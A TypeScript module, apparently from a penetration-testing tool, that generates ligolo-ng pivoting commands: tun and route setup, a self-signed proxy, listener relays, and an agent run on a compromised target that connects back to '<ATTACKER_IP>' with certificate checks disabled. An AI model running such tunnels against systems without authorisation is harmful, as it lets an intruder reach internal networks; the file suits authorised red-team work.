// app/ui/ligolo-ng/CommandResolver.ts

import { LigoloPivot } from "@/app/hooks/usePivotChain";
import { PivotCommands } from "./Types";

/* ---------------- Templates ---------------- */

const commandTemplates = {
  tun: "sudo ip tuntap add user $(whoami) mode tun {{tun}}",
  route: "sudo ip route add {{network}}/{{cidr}} dev {{tun}}",
  proxy: "./proxy -selfcert -laddr {{bindIP}}:{{port}}",
  agent: "{{agentBin}} -connect {{connectIP}}:{{port}} -ignore-cert",
  session: "session",
  startTun: "start --tun {{tun}}",
  listener: "listener_add --addr 0.0.0.0:{{port}} --to 127.0.0.1:{{prevPort}} --tcp",
};

/* ---------------- Sequences ---------------- */

const ENTRY_SEQUENCE = [
  "tun",
  "route",
  "proxy",
  "agent",
  "session",
  "startTun",
] as const;

const RELAY_SEQUENCE = [
  "listener",
  "tun",
  "route",
  "agent",
  "session",
  "startTun",
] as const;

/* ---------------- Helpers ---------------- */

function render(template: string, ctx: Record<string, string | number>) {
  return template.replace(/{{(\w+)}}/g, (_, k) => String(ctx[k] ?? ""));
}

function plane(cmd: string): "attacker" | "target" {
  return cmd === "agent" ? "target" : "attacker";
}

/* ---------------- Resolver ---------------- */

export function resolvePivotCommands(
  pivots: LigoloPivot[]
): PivotCommands[] {
  let step = 1;

  return pivots.map((pivot, idx) => {
    const tun = `ligolo${idx + 1}`;
    const prev = idx > 0 ? pivots[idx - 1] : undefined;


    let connectIP: string;

    if (pivot.role === "entry") {
      connectIP = pivot.attackerIP?.trim()
        ? pivot.attackerIP
        : "<ATTACKER_IP>";
    } else {
      connectIP = pivot.targetIP?.trim()
        ? pivot.targetIP
        : "<PREVIOUS_TARGET_IP>";
    }

    const agentBin =  pivot.targetOS === "windows" ? "./agent.exe" : "./agent";

    /* -------- Context -------- */

    const ctx = {
      tun,
      network: pivot.network,
      cidr: pivot.cidr,
      bindIP: pivot.attackerBindIP,
      port: pivot.attackerPort,
      connectIP,
      prevPort: prev?.attackerPort ?? "",
      agentBin,
    };

    const cmds: PivotCommands = { attacker: [], target: [] };
    const sequence =
      pivot.role === "entry" ? ENTRY_SEQUENCE : RELAY_SEQUENCE;

    for (const key of sequence) {
      cmds[plane(key)].push({
        step: step++,
        command: render(commandTemplates[key], ctx),
      });
    }

    return cmds;
  });
}
